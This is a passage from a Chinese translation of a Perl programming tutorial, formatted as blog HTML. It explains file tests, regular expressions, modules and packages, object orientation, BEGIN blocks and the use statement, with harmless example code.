class="line">&lt;STDIN&gt;;</span><br></pre></td></tr></table></figure><p>调用<code>&lt;&gt;</code>而不提供文件句柄参数，表示从<code>STDIN</code>或者在Perl脚本启动时指定的参数指向的文件中读取。</p><p>你可能已经知道了，如果不提供文件句柄，<code>print</code>默认会打印到<code>STDOUT</code>。</p><h4 id="文件检测"><a href="#文件检测" class="headerlink" title="文件检测"></a>文件检测</h4><p>内置函数<code>-e</code>用于测试文件是否存在。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print &quot;what&quot; unless -e &quot;&#x2F;usr&#x2F;bin&#x2F;perl&quot;;</span><br></pre></td></tr></table></figure><p>内置函数<code>-d</code>用于测试文件是否是目录。</p><p>内置函数<code>-f</code>用于测试文件是否是普通文件。</p><p>这只是<a href="http://perldoc.perl.org/functions/-X.html" target="_blank" rel="noopener">一大波形如<code>-X</code>的函数</a>中的三个，其中<code>X</code>是某些小写或大写字母。这类函数被称作<em>文件检测函数</em>。请注意字母前面的减号，用Google搜索的时候，减号表示从搜索结果中排除包含这个词的结果，这样就导致很难用Google搜索文件检测函数了！用“Perl file test”来搜索就好。</p><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>除了Perl以外，正则表达式也被应用在许多其他的语言和工具中。Perl的核心正则表达式语法基本上和其他地方别无二致，不过Perl完整的正则表达式功能复杂到令人发指，并且难以理解。我能给的最好的建议就是尽可能避免引入不必要的复杂性。</p><p>用<code>=~ m//</code>运算符进行正则表达式匹配。在scalar上下文中，<code>=~ m//</code>在成功时返回true，而失败是返回false。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my $string &#x3D; &quot;Hello world&quot;;</span><br><span class="line">if($string &#x3D;~ m&#x2F;(\w+)\s+(\w+)&#x2F;) &#123;</span><br><span class="line">print &quot;success&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>圆括号表示匹配组，匹配成功以后，匹配组被填入内置变量<code>$1</code>、<code>$2</code>、<code>$3</code>……：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print $1; # &quot;Hello&quot;</span><br><span class="line">print $2; # &quot;world&quot;</span><br></pre></td></tr></table></figure><p>在列表上下文中，<code>=~ m//</code>返回<code>$1</code>、<code>$2</code>……组成的列表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my $string &#x3D; &quot;colourless green ideas sleep furiously&quot;;</span><br><span class="line">my @matches &#x3D; $string &#x3D;~ m&#x2F;(\w+)\s+((\w+)\s+(\w+))\s+(\w+)\s+(\w+)&#x2F;;</span><br><span class="line"></span><br><span class="line">print join &quot;, &quot;, map &#123; &quot;&#39;&quot;.$_.&quot;&#39;&quot; &#125; @matches;</span><br><span class="line"># prints &quot;&#39;colourless&#39;, &#39;green ideas&#39;, &#39;green&#39;, &#39;ideas&#39;, &#39;sleep&#39;, &#39;furiously&#39;&quot;</span><br></pre></td></tr></table></figure><p>用<code>=~ s///</code>运算符进行正则表达式替换。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my $string &#x3D; &quot;Good morning world&quot;;</span><br><span class="line">$string &#x3D;~ s&#x2F;world&#x2F;Vietnam&#x2F;;</span><br><span class="line">print $string; # &quot;Good morning Vietnam&quot;</span><br></pre></td></tr></table></figure><p>请注意<code>$string</code>的内容发生了怎样的改变。你必须在<code>=~ s///</code>运算符左边提供一个scalar变量，如果你提供了字面字符串，会返回一个错误。</p><p><code>/g</code>标志表示“全局匹配”（译者注：原文“group match”，应为“global match”更为确切）。</p><p>在scalar上下文中，每次<code>=~ m//g</code>调用都会返回下一个匹配项，成功是返回true，而失败时返回false。然后你还是可以通过<code>$1</code>等等来得到匹配的组。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my $string &#x3D; &quot;a tonne of feathers or a tonne of bricks&quot;;</span><br><span class="line">while($string &#x3D;~ m&#x2F;(\w+)&#x2F;g) &#123;</span><br><span class="line">  print &quot;&#39;&quot;.$1.&quot;&#39;\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在列表上下文中，<code>=~ m//g</code>一次性返回所有匹配的结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my @matches &#x3D; $string &#x3D;~ m&#x2F;(\w+)&#x2F;g;</span><br><span class="line">print join &quot;, &quot;, map &#123; &quot;&#39;&quot;.$_.&quot;&#39;&quot; &#125; @matches;</span><br></pre></td></tr></table></figure><p>每次<code>=~ s///g</code>调用会进行一次全局的查找/替换，并且返回匹配的次数。在这里，我们把所有元音字母用字母“r”替代。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 先不用&#x2F;g进行一次替换</span><br><span class="line">$string &#x3D;~ s&#x2F;[aeiou]&#x2F;r&#x2F;;</span><br><span class="line">print $string; # &quot;r tonne of feathers or a tonne of bricks&quot;</span><br><span class="line"></span><br><span class="line"># 再替换一次</span><br><span class="line">$string &#x3D;~ s&#x2F;[aeiou]&#x2F;r&#x2F;;</span><br><span class="line">print $string; # &quot;r trnne of feathers or a tonne of bricks&quot;</span><br><span class="line"></span><br><span class="line"># 用&#x2F;g全部替换</span><br><span class="line">$string &#x3D;~ s&#x2F;[aeiou]&#x2F;r&#x2F;g;</span><br><span class="line">print $string, &quot;\n&quot;; # &quot;r trnnr rf frrthrrs rr r trnnr rf brrcks&quot;</span><br></pre></td></tr></table></figure><p><code>/i</code>标志表示查找替换对于大小写不敏感。</p><p><code>/x</code>标志允许正则表达式中包含空白符（例如换行符）和注释。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;Hello world&quot; &#x3D;~ m&#x2F;</span><br><span class="line">  (\w+) # one or more word characters</span><br><span class="line">  [ ]   # single literal space, stored inside a character class</span><br><span class="line">  world # literal &quot;world&quot;</span><br><span class="line">&#x2F;x;</span><br><span class="line"></span><br><span class="line"># returns true</span><br></pre></td></tr></table></figure><h3 id="模块和包"><a href="#模块和包" class="headerlink" title="模块和包"></a>模块和包</h3><p>在Perl中，模块（module）和包（package）是不同的东西。</p><h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><p><em>模块</em>是你可以<em>包含</em>在另一个Perl文件（脚本或模块）中的一个<code>.pm</code>文件，是与<code>.pl</code>Perl脚本语法完全相同的文本文件。一个示例模块文件可能位于<code>C:\foo\bar\baz\Demo\StringUtils.pm</code>或者<code>/foo/bar/baz/Demo/StringUtils.pm</code>，并且有如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">sub zombify &#123;</span><br><span class="line">my $word &#x3D; shift @_;</span><br><span class="line">$word &#x3D;~ s&#x2F;[aeiou]&#x2F;r&#x2F;g;</span><br><span class="line">return $word;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 1;</span><br></pre></td></tr></table></figure><p>因为模块在被加载时会自顶向下执行，你需要在结尾处返回一个true表示加载成功。</p><p>为了让Perl解释器能够找到这些Perl模块文件，调用<code>perl</code>程序前，包含它们的目录名需要被添加到环境变量<code>PERL5LIB</code>中。列出包含这些模块的根目录，而不是其中的某些子目录或者模块本身：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set PERL5LIB&#x3D;C:\foo\bar\baz;%PERL5LIB%</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PERL5LIB&#x3D;&#x2F;foo&#x2F;bar&#x2F;baz:$PERL5LIB</span><br></pre></td></tr></table></figure><p>一旦Perl模块被创建并且<code>perl</code>知道如何找到它以后，你就可以使用内置函数<code>require</code>在Perl脚本中查找并执行它。比如，调用<code>require Demo::StringUtils</code>使Perl解释器去逐个查找所有列在<code>PERL5LIB</code>中的目录，看是否有叫做<code>Demo/StringUtils.pm</code>的文件。我们的示例脚本可以叫做<code>main.pl</code>，并且包含以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">require Demo::StringUtils;</span><br><span class="line"></span><br><span class="line">print zombify(&quot;i want brains&quot;); # &quot;r wrnt brrrns&quot;</span><br></pre></td></tr></table></figure><p><em>注意，在这里我们用双冒号<code>::</code>作为目录的分隔符。</em></p><p>现在问题来了：如果<code>main.pl</code>包含很多<code>require</code>调用，而且每个被加载的模块又包含更多<code>require</code>调用，那我们要找到<code>zombify()</code>子程序最初的定义就太困难了。解决方案是使用包。</p><h4 id="包"><a href="#包" class="headerlink" title="包"></a>包</h4><p><em>包</em>是用来声明子程序的命名空间。所有的子程序默认都被声明在当前包中，而程序开始执行的时候，你位于<code>main</code>包中，不过你可以用内置函数<code>package</code>来切换包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">sub subroutine &#123;</span><br><span class="line">print &quot;universe&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">package Food::Potatoes;</span><br><span class="line"></span><br><span class="line"># 没有冲突：</span><br><span class="line">sub subroutine &#123;</span><br><span class="line">print &quot;kingedward&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>注意，我们这里使用双冒号<code>::</code>作为命名空间的分隔符。</em></p><p>当你调用一个子程序的时候，你默认会调用当前包中的子程序。你也可以显示指定包的名字，我们继续上面的脚本，看看会发生什么：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">subroutine();                 # &quot;kingedward&quot;</span><br><span class="line">main::subroutine();           # &quot;universe&quot;</span><br><span class="line">Food::Potatoes::subroutine(); # &quot;kingedward&quot;</span><br></pre></td></tr></table></figure><p>所以对上面描述的问题的一个符合逻辑的解决方案就是把<code>C:\foo\bar\baz\Demo\StringUtils.pm</code>或者<code>/foo/bar/baz/Demo/StringUtils.pm</code>改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">package Demo::StringUtils;</span><br><span class="line"></span><br><span class="line">sub zombify &#123;</span><br><span class="line">my $word &#x3D; shift @_;</span><br><span class="line">$word &#x3D;~ s&#x2F;[aeiou]&#x2F;r&#x2F;g;</span><br><span class="line">return $word;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 1;</span><br></pre></td></tr></table></figure><p>然后把<code>main.pl</code>改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">require Demo::StringUtils;</span><br><span class="line"></span><br><span class="line">print Demo::StringUtils::zombify(&quot;i want brains&quot;); # &quot;r wrnt brrrns&quot;</span><br></pre></td></tr></table></figure><p>下面这些内容可要仔细阅读了。</p><p>在Perl语言中包和模块是彼此独立完全不同的两个功能，它们恰好都是用双冒号作为分隔符根本就是个掩人耳目的把戏。在一个脚本或者模块中多次切换包是可行的，在不用位置的多个文件中使用同一个包名也是可行的。调用<code>require Foo::Bar</code><em>并不会</em>去查找并且加载一个有<code>package Foo::Bar</code>的文件，也不一定会加载定义在<code>Foo::Bar</code>命名空间里的子程序。调用<code>require Foo::Bar</code>仅仅表示加载一个名为<code>Foo/Bar.pm</code>的问题，与其中有什么包的声明没有<em>任何</em>关系，也许那个文件中声明了<code>package Baz::Qux</code>和其他乱七八糟的内容。</p><p>同样的，调用<code>Baz::Qux::processThis()</code>子程序并不一定要声明在名叫<code>Baz/Qux.pm</code>的文件里，它可能被定义在<em>任何地方</em>。</p><p>分离这两种功能可能是Perl中最糟糕的一个设计，而如果把它们视作分开的功能，将带来混乱，以及让人抓狂的代码。值得庆幸的是，主流的Perl程序员总是遵循下面两个规则：</p><ol><li><strong>Perl脚本（<code>.pl</code>文件）不应该包含<code>package</code>声明。</strong></li><li><strong>Perl模块（<code>.pm</code>文件）必须包含且仅包含一个<code>package</code>声明，且包名与它的文件名、所在的位置一致。</strong>例如，模块<code>Demo/StringUtils.pm</code>必须由<code>package Demo::StringUtils</code>开头。</li></ol><p>因此，你会发现实际工作中，绝大部分由可靠的第三方提供的“包”和“模块”的概念是<em>可以</em>交换混用的。然而，很重要的是，你千万不能把这个当做承诺，因为将来有一天你<em>一定会</em>碰上一个疯子写的代码。</p><h3 id="Perl的面向对象"><a href="#Perl的面向对象" class="headerlink" title="Perl的面向对象"></a>Perl的面向对象</h3><p>Perl不是面向对象编程的最佳选择，Perl的面向对象机制是后来嫁接进去的，下面我们就看看是怎么回事。</p><ul><li><em>对象</em>只是一个引用（也就是一个scalar变量），它恰好知道自己属于哪个类。要告诉一个引用它所指向的内容属于哪个类，使用<code>bless</code>。要知道引用所指向的内容属于哪个类（如果有的话），使用<code>ref</code>。</li><li><em>方法</em>只是一个子程序，接受对象（或者对于类的方法，就是包名）作为第一个参数。使用<code>$obj-&gt;method()</code>可以调用对象的方法，用<code>Package::Name-&gt;method()</code>可以调用类的方法。（译者注：所谓类的方法，在其他语言里就相当于类的静态方法。）</li><li><em>类</em>就是包含一组方法的包。</li></ul><p>下面有个简短的例子来帮助我们弄清楚这些概念。示例模块<code>Animal.pm</code>包含<code>Animal</code>类，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">package Animal;</span><br><span class="line"></span><br><span class="line">sub eat &#123;</span><br><span class="line"># 第一个参数总是操作所基于的对象</span><br><span class="line">my $self &#x3D; shift @_;</span><br><span class="line"></span><br><span class="line">foreach my $food ( @_ ) &#123;</span><br><span class="line">if($self-&gt;can_eat($food)) &#123;</span><br><span class="line">print &quot;Eating &quot;, $food;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">print &quot;Can&#39;t eat &quot;, $food;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 就这个参数来说，假设动物可以吃任何东西</span><br><span class="line">sub can_eat &#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 1;</span><br></pre></td></tr></table></figure><p>然后我们可以这样使用这个类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">require Animal;</span><br><span class="line"></span><br><span class="line">my $animal &#x3D; &#123;</span><br><span class="line">&quot;legs&quot;   &#x3D;&gt; 4,</span><br><span class="line">&quot;colour&quot; &#x3D;&gt; &quot;brown&quot;,</span><br><span class="line">&#125;;                       # $animal是一个普通的hash的引用</span><br><span class="line">print ref $animal;       # &quot;HASH&quot;</span><br><span class="line">bless $animal, &quot;Animal&quot;; # 现在它是&quot;Animal&quot;类的对象</span><br><span class="line">print ref $animal;       # &quot;Animal&quot;</span><br></pre></td></tr></table></figure><p>注意：任何引用都可以被转换（bless）成任何类的对象。需要由你来保证（1）这个引用指向的内容可以被当做这个类的对象来使用，并且（2）被转换成的这个类存在，并且已经被加载了。</p><p>你仍然可以按以前的方式操作这个hash：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print &quot;Animal has &quot;, $animal-&gt;&#123;&quot;legs&quot;&#125;, &quot; leg(s)&quot;;</span><br></pre></td></tr></table></figure><p>但你也可以同样用<code>-&gt;</code>运算符调用这个对象的方法，就像这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$animal-&gt;eat(&quot;insects&quot;, &quot;curry&quot;, &quot;eucalyptus&quot;);</span><br></pre></td></tr></table></figure><p>最后那句调用等价于<code>Animal::eat($animal, &quot;insects&quot;, &quot;curry&quot;, &quot;eucalyptus&quot;)</code>。</p><h4 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h4><p>构造函数是这个类返回新对象的方法。如果你需要，声明一个就是了，用你喜欢的任何名字都可以。对于类的方法，第一个参数是类名而不是一个对象，在这个例子里就是<code>&quot;Animal&quot;</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">package Animal;</span><br><span class="line"></span><br><span class="line">sub new &#123;</span><br><span class="line">my $class &#x3D; shift @_;</span><br><span class="line">return bless &#123; &quot;legs&quot; &#x3D;&gt; 4, &quot;colour&quot; &#x3D;&gt; &quot;brown&quot; &#125;, $class;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># ...etc.</span><br></pre></td></tr></table></figure><p>然后像下面这样使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my $animal &#x3D; Animal-&gt;new();</span><br></pre></td></tr></table></figure><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>要创建一个类继承自基类，用<code>use parent</code>，假设我们给<code>Animal</code>创建一个子类叫<code>Koala</code>，位于<code>Koala.pm</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">package Koala;</span><br><span class="line"></span><br><span class="line"># 继承自Animal</span><br><span class="line">use parent (&quot;Animal&quot;);</span><br><span class="line"></span><br><span class="line"># 重载一个方法</span><br><span class="line">sub can_eat &#123;</span><br><span class="line">my $self &#x3D; shift @_; # 没有使用，你也可以直接在这里写&quot;shift @_;&quot;</span><br><span class="line">my $food &#x3D; shift @_;</span><br><span class="line">return $food eq &quot;eucalyptus&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 1;</span><br></pre></td></tr></table></figure><p>下面是一些示例程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">require Koala;</span><br><span class="line"></span><br><span class="line">my $koala &#x3D; Koala-&gt;new();</span><br><span class="line"></span><br><span class="line">$koala-&gt;eat(&quot;insects&quot;, &quot;curry&quot;, &quot;eucalyptus&quot;); # 只吃eucalyptus</span><br></pre></td></tr></table></figure><p>最后那个方法调用尝试执行<code>Koala::eat($koala, &quot;insects&quot;, &quot;curry&quot;, &quot;eucalyptus&quot;)</code>，但子程序<code>eat()</code>并没有在<code>Koala</code>包里定义。然而，因为<code>Koala</code>有父类<code>Animal</code>，Perl解释器会再尝试调用<code>Animal::eat($koala, &quot;insects&quot;, &quot;curry&quot;, &quot;eucalyptus&quot;)</code>，这回没问题。请注意<code>Animal</code>类是如何自动被<code>Koala.pm</code>加载的。</p><p>因为<code>use parent</code>接受一组父类的名字，所以Perl支持多重继承，当然也就包含了它所带来的所有好处和噩梦。</p><h3 id="BEGIN块"><a href="#BEGIN块" class="headerlink" title="BEGIN块"></a><code>BEGIN</code>块</h3><p><code>BEGIN</code>块在<code>perl</code>解释完这个代码块以后就立即被执行，甚至在文件剩下的部分被解释之前，而这个代码块在运行时则被忽略：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">print &quot;This gets printed second&quot;;</span><br><span class="line"></span><br><span class="line">BEGIN &#123;</span><br><span class="line">print &quot;This gets printed first&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print &quot;This gets printed third&quot;;</span><br></pre></td></tr></table></figure><p><code>BEGIN</code>块总是首先执行。如果你创建了多个<code>BEGIN</code>块（别这么做），它们将按照解释器解释它们的顺序自上而下执行。<code>BEGIN</code>即使出现在脚本中间（别这么做）或者脚本最后（也别这么做），它也会首先被执行。<strong>不要搞乱自然的代码执行顺序，总是把<code>BEGIN</code>块放在开头！</strong></p><p><code>BEGIN</code>块在解释完后立即被执行，执行完毕以后将从这个<code>BEGIN</code>块结束处继续<em>解释</em>剩下的代码。如果<code>BEGIN</code>块以外的任何代码被执行了，那么整个脚本或者模块就已经被解释了一遍，且仅有一遍。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">print &quot;This &#39;print&#39; statement gets parsed successfully but never executed&quot;;</span><br><span class="line"></span><br><span class="line">BEGIN &#123;</span><br><span class="line">print &quot;This gets printed first&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print &quot;This, also, is parsed successfully but never executed&quot;;</span><br><span class="line"></span><br><span class="line">...because e4h8v3oitv8h4o8gch3o84c3 there is a huge parsing error down here.</span><br></pre></td></tr></table></figure><p>（译者注：上面程序的最后一行不是注释，作者写最后一行是构造一个语法错误，因而造成BEGIN块在解释到这里之前就已经被执行，而BEGIN块执行完毕以后继续恢复解释，一旦遇上语法错误，脚本其他部分将不会再被执行。）</p><p>因为它们在脚本编译时就执行，<code>BEGIN</code>块即使在条件分支中也<em>仍然</em>会在编译时就运行，哪怕条件将被判定为false，因为在那时条件<em>还根本没有被求值</em>，甚至<em>可能永远不会被求值</em>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(0) &#123;</span><br><span class="line">BEGIN &#123;</span><br><span class="line">print &quot;This will definitely get printed&quot;;</span><br><span class="line">&#125;</span><br><span class="line">print &quot;Even though this won&#39;t&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>不要把<code>BEGIN</code>块放在条件分支里！</strong>如果你要在编译时做一些条件判断，把这个条件判断放在<code>BEGIN</code>块<em>里面</em>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BEGIN &#123;</span><br><span class="line">if($condition) &#123;</span><br><span class="line"># etc.</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="use"><a href="#use" class="headerlink" title="use"></a><code>use</code></h3><p>好，现在让我们来理解一下包、模块、类的方法和<code>BEGIN</code>块那模棱两可的行为以及语义，我会来解释一下超级常见的<code>use</code>函数。</p><p>下面三条语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use Caterpillar (&quot;crawl&quot;, &quot;pupate&quot;);</span><br><span class="line">use Caterpillar ();</span><br><span class="line">use Caterpillar;</span><br></pre></td></tr></table></figure><p>分别和下面的三段等价：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">BEGIN &#123;</span><br><span class="line">require Caterpillar;</span><br><span class="line">Caterpillar-&gt;import(&quot;crawl&quot;, &quot;pupate&quot;);</span><br><span class="line">&#125;</span><br><span class="line">BEGIN &#123;</span><br><span class="line">require Caterpillar;</span><br><span class="line">&#125;</span><br><span class="line">BEGIN &#123;</span><br><span class="line">require Caterpillar;</span><br><span class="line">Caterpillar-&gt;import();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>不，这三个例子并没有放错顺序，只是Perl比较笨罢了。</li><li><code>use</code>只是<code>BEGIN</code>块的伪装，同样的警告对此也适用。<code>use</code> 语句必须总是放在文件开头，并且<strong>永远不要放在条件分支里</strong>。</li><li><code>import()</code>并不是Perl的内置函数，它只是一个<strong>用户自定义的类方法</strong>。定义或者继承<code>import()</code>函数的重任就落在写<code>Caterpillar</code>这个包的程序员身上了。这个方法理论上可以接受任何东西作为参数，也可以对参数做任何操作。<code>use Caterpillar;</code>可以做任何事情，你需要查询<code>Caterpillar.pm</code>的文档来判断到底会发生什么。</li><li>请注意<code>require Caterpillar</code>是如何加载一个名为<code>Caterpillar.pm</code>的<strong>模块</strong>的，而<code>Caterpillar-&gt;import()</code>则调用定义在<code>Caterpillar</code><strong>包</strong>里的子程序<code>import()</code>。我们只能一起期待这里的模块和包是一致的！</li></ul><h3 id="Exporter"><a href="#Exporter" class="headerlink" title="Exporter"></a>Exporter</h3><p>定义一个<code>import()</code>方法最常见的办法是从<a href="http://perldoc.perl.org/Exporter.html" target="_blank" rel="noopener">Exporter</a>模块继承下来。Exporter是一个核心模块，也是Perl语言中成为<em>事实标准</em>的核心功能。在Exporter的<code>import()</code>实现中，你传入的参数列表将被认为是子程序名字的列表，当一个子程序被<code>import()</code>，它在当前包和原来所在的包里就都可以被使用了。</p><p>用一个例子最能帮助理解这个概念。<code>Caterpillar.pm</code>的内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 